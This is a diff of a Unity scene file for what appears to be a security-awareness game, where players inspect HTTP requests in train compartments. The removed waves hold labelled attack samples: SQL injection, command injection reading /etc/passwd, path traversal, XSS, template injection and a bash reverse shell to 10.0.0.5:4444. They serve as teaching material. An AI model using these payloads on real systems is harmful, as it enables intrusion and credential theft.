@@ -272,7 +272,7 @@ MonoBehaviour:
     m_HighlightedColor: {r: 0.8396226, g: 0.8396226, b: 0.8396226, a: 1}
     m_PressedColor: {r: 0.6037736, g: 0.6037736, b: 0.6037736, a: 1}
     m_SelectedColor: {r: 0.9607843, g: 0.9607843, b: 0.9607843, a: 1}
-    m_DisabledColor: {r: 0.2924528, g: 0.2924528, b: 0.2924528, a: 0.5019608}
+    m_DisabledColor: {r: 0.5568628, g: 0.5568628, b: 0.5568628, a: 1}
     m_ColorMultiplier: 1
     m_FadeDuration: 0.1
   m_SpriteState:
@@ -356,7 +356,10 @@ MonoBehaviour:
   targetInspectable: {fileID: 1947682775}
   popupUI: {fileID: 1156341610}
   trainController: {fileID: 758005010}
+  button: {fileID: 0}
   tutorialInteractionId: train_compartment
+  continueDialogueTriggerRelay: {fileID: 0}
+  continueDialogueTriggerId: train_compartment3_inspected
 --- !u!1 &410981255
 GameObject:
   m_ObjectHideFlags: 0
@@ -420,23 +423,31 @@ MonoBehaviour:
       delayBeforeWaveStarts: 0
       snapSelectedTrainsToOffScreenLeftBeforeEntry: 0
       compartmentData:
-      - compartment: {fileID: 10152729}
-        title: Auth Request
-        data: 'POST /api/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n{\n 
-          \"username\": \"jsmith\",\n  \"password\": \"Tr0ub4dor&3\"\n}'
       - compartment: {fileID: 551808148}
-        title: Product Query
-        data: 'GET /api/products?category=electronics&sort=price&order=asc&page=2 HTTP/1.1\nHost:
-          example.com\nAccept: application/json'
+        title: Protocol and Flags
+        data: 'Protocol: TCP
+
+
+          Flags: SYN, ACK'
+      - compartment: {fileID: 10152729}
+        title: Source IP and Ports
+        data: 'Source IP: 172.58.99.240
+
+
+          Source Port: 443
+
+
+          Destination
+          Port: 5146'
       - compartment: {fileID: 1947682775}
-        title: Comment Submission
-        data: 'POST /api/comments HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"post_id\": 42,\n  \"body\": \"Great article! Really helped me understand
-          the topic.\",\n  \"author\": \"alice\"\n}'
+        title: Frame Number and Packet Size
+        data: 'Frame Number: 2
+
+
+          Packet Size: 68'
       - compartment: {fileID: 1626612990}
-        title: Health Check
-        data: 'POST /api/ping HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"host\": \"8.8.8.8\"\n}'
+        title: Payload
+        data: '@..t^..M...F..N..LX.........Jn....................S/7&..R...2QXb...9..a.|.6..]K.L..h.}?..nm.wt....Ij.k.+1&.....Yvl%.~t.!.l..rw....Y..A......A...r<>.X....E..6{8.EJ....)7........]<.7E.R..''.4...wS.'
     - triggerId: train_wave_2
       isSuspicious: 0
       triggerFollowingWaveInList: 1
@@ -461,97 +472,6 @@ MonoBehaviour:
       - compartment: {fileID: 1626612990}
         title: Cart Sync
         data: 'PUT /api/cart HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"items\":[{\"sku\":\"ABC-1\",\"qty\":2}]}'
-    - triggerId: train_wave_3
-      isSuspicious: 1
-      triggerFollowingWaveInList: 1
-      trainIndices: 00000000
-      startAllSelectedTrainsAtOnce: 0
-      delayBeforeWaveStarts: 0
-      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
-      compartmentData:
-      - compartment: {fileID: 10152729}
-        title: SQL Injection Attempt
-        data: 'POST /api/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"username\": \"admin'' OR ''1''=''1'' --\",\n  \"password\": \"anything\"\n}'
-      - compartment: {fileID: 551808148}
-        title: Malicious Query
-        data: 'GET /api/products?id=42 UNION SELECT username,password,NULL FROM users--
-          HTTP/1.1\nHost: example.com\nAccept: application/json'
-      - compartment: {fileID: 1947682775}
-        title: Command Injection Probe
-        data: 'POST /api/ping HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"host\": \"8.8.8.8; cat /etc/passwd\"\n}'
-      - compartment: {fileID: 1626612990}
-        title: Encoded Attack String
-        data: 'GET /api/files?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd%7ccat%20/etc/shadow
-          HTTP/1.1\nHost: example.com'
-    - triggerId: train_wave_4
-      isSuspicious: 0
-      triggerFollowingWaveInList: 1
-      trainIndices: 00000000
-      startAllSelectedTrainsAtOnce: 0
-      delayBeforeWaveStarts: 0
-      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
-      compartmentData:
-      - compartment: {fileID: 10152729}
-        title: Comment Submission
-        data: 'POST /api/comments HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"post_id\": 42,\n  \"body\": \"Great article! Really helped me understand
-          the topic.\",\n  \"author\": \"alice\"\n}'
-      - compartment: {fileID: 551808148}
-        title: Public Profile Read
-        data: 'GET /api/users/alice/profile HTTP/1.1\nHost: example.com\nAccept:
-          application/json'
-      - compartment: {fileID: 1947682775}
-        title: Preferences Save
-        data: 'PUT /api/preferences HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"theme\":\"dark\",\"layout\":\"compact\"}'
-      - compartment: {fileID: 1626612990}
-        title: Notification Ack
-        data: 'POST /api/notifications/ack HTTP/1.1\nHost: example.com\nContent-Type:
-          application/json\n\n{\"ids\":[12,13,14]}'
-    - triggerId: train_wave_5
-      isSuspicious: 1
-      triggerFollowingWaveInList: 1
-      trainIndices: 00000000
-      startAllSelectedTrainsAtOnce: 0
-      delayBeforeWaveStarts: 0
-      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
-      compartmentData:
-      - compartment: {fileID: 10152729}
-        title: SQL Union Injection
-        data: 'GET /api/products?id=42 UNION SELECT username,password,NULL FROM
-          users-- HTTP/1.1\nHost: example.com\nAccept: application/json'
-      - compartment: {fileID: 551808148}
-        title: Login Bypass Pattern
-        data: 'POST /api/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"username\": \"'' OR 1=1 --\",\n  \"password\": \"irrelevant\"\n}'
-      - compartment: {fileID: 1947682775}
-        title: XSS Probe
-        data: 'POST /api/comments HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"post_id\":7,\"body\":\"<script>alert(1)</script>\",\"author\":\"eve\"}'
-      - compartment: {fileID: 1626612990}
-        title: Reconnaissance
-        data: 'GET /api/admin?debug=true&dump=config HTTP/1.1\nHost: example.com'
-    - triggerId: train_wave_6
-      isSuspicious: 1
-      triggerFollowingWaveInList: 1
-      trainIndices: 00000000
-      startAllSelectedTrainsAtOnce: 0
-      delayBeforeWaveStarts: 0
-      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
-      compartmentData:
-      - compartment: {fileID: 10152729}
-        title: Command Injection Attempt
-        data: 'POST /api/ping HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
-          \"host\": \"8.8.8.8; cat /etc/passwd\"\n}'
-      - compartment: {fileID: 551808148}
-        title: Reverse Shell Probe
-        data: 'POST /api/ping HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"host\":\"127.0.0.1 && bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\"}'
-      - compartment: {fileID: 1947682775}
-        title: Path Traversal Attempt
-        data: 'GET /api/files?path=../../../../etc/passwd HTTP/1.1\nHost: example.com'
-      - compartment: {fileID: 1626612990}
-        title: Template Injection Probe
-        data: 'POST /api/render HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"template\":\"${7*7}\"}'
 --- !u!4 &410981257
 Transform:
   m_ObjectHideFlags: 0
@@ -1580,7 +1500,7 @@ MonoBehaviour:
     m_HighlightedColor: {r: 0.8396226, g: 0.8396226, b: 0.8396226, a: 1}
     m_PressedColor: {r: 0.6037736, g: 0.6037736, b: 0.6037736, a: 1}
     m_SelectedColor: {r: 0.9607843, g: 0.9607843, b: 0.9607843, a: 1}
-    m_DisabledColor: {r: 0.2924528, g: 0.2924528, b: 0.2924528, a: 0.5019608}
+    m_DisabledColor: {r: 0.5566038, g: 0.5566038, b: 0.5566038, a: 1}
     m_ColorMultiplier: 1
     m_FadeDuration: 0.1
   m_SpriteState:
@@ -1664,7 +1584,10 @@ MonoBehaviour:
   targetInspectable: {fileID: 551808148}
   popupUI: {fileID: 1156341610}
   trainController: {fileID: 758005010}
+  button: {fileID: 0}
   tutorialInteractionId: train_compartment
+  continueDialogueTriggerRelay: {fileID: 0}
+  continueDialogueTriggerId: train_compartment1_inspected
 --- !u!1001 &1462000000
 PrefabInstance:
   m_ObjectHideFlags: 0
@@ -1991,7 +1914,7 @@ MonoBehaviour:
     m_HighlightedColor: {r: 0.8396226, g: 0.8396226, b: 0.8396226, a: 1}
     m_PressedColor: {r: 0.6037736, g: 0.6037736, b: 0.6037736, a: 1}
     m_SelectedColor: {r: 0.9607843, g: 0.9607843, b: 0.9607843, a: 1}
-    m_DisabledColor: {r: 0.2924528, g: 0.2924528, b: 0.2924528, a: 0.5019608}
+    m_DisabledColor: {r: 0.5568628, g: 0.5568628, b: 0.5568628, a: 1}
     m_ColorMultiplier: 1
     m_FadeDuration: 0.1
   m_SpriteState:
@@ -2075,7 +1998,10 @@ MonoBehaviour:
   targetInspectable: {fileID: 1626612990}
   popupUI: {fileID: 1156341610}
   trainController: {fileID: 758005010}
+  button: {fileID: 0}
   tutorialInteractionId: train_compartment
+  continueDialogueTriggerRelay: {fileID: 0}
+  continueDialogueTriggerId: train_compartment4_inspected
 --- !u!1 &1626612988
 GameObject:
   m_ObjectHideFlags: 0
@@ -2376,7 +2302,7 @@ MonoBehaviour:
     m_HighlightedColor: {r: 0.8396226, g: 0.8396226, b: 0.8396226, a: 1}
     m_PressedColor: {r: 0.6037736, g: 0.6037736, b: 0.6037736, a: 1}
     m_SelectedColor: {r: 0.9607843, g: 0.9607843, b: 0.9607843, a: 1}
-    m_DisabledColor: {r: 0.2924528, g: 0.2924528, b: 0.2924528, a: 0.5019608}
+    m_DisabledColor: {r: 0.5568628, g: 0.5568628, b: 0.5568628, a: 1}
     m_ColorMultiplier: 1
     m_FadeDuration: 0.1
   m_SpriteState:
@@ -2460,7 +2386,10 @@ MonoBehaviour:
   targetInspectable: {fileID: 10152729}
   popupUI: {fileID: 1156341610}
   trainController: {fileID: 758005010}
+  button: {fileID: 0}
   tutorialInteractionId: train_compartment
+  continueDialogueTriggerRelay: {fileID: 0}
+  continueDialogueTriggerId: train_compartment2_inspected
 --- !u!1001 &1746515908160394454
 PrefabInstance:
   m_ObjectHideFlags: 0
